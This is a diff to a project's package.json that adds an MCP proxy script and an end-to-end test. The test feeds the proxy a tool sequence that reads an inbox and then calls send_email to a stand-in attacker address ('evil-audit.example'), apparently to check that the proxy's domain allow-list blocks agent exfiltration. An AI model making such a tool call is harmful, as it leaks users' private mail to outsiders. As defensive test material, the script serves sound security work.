@@ -17,7 +17,9 @@
     "scan": "tsx scripts/scan-github.ts",
     "dev": "vite",
     "build": "vite build",
-    "preview": "vite preview --port 4319"
+    "preview": "vite preview --port 4319",
+    "proxy": "tsx scripts/mcp-proxy.ts",
+    "e2e:proxy": "printf '%s\\n' '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/list\"}' '{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"read_inbox\",\"arguments\":{}}}' '{\"jsonrpc\":\"2.0\",\"id\":3,\"method\":\"tools/call\",\"params\":{\"name\":\"send_email\",\"arguments\":{\"to\":\"it-audit@evil-audit.example\",\"body\":\"x\"}}}' | tsx scripts/mcp-proxy.ts --allow '*.town.gov' -- node tests/fixtures/fake-mcp-server.mjs"
   },
   "devDependencies": {
     "@types/node": "^26.6.4",
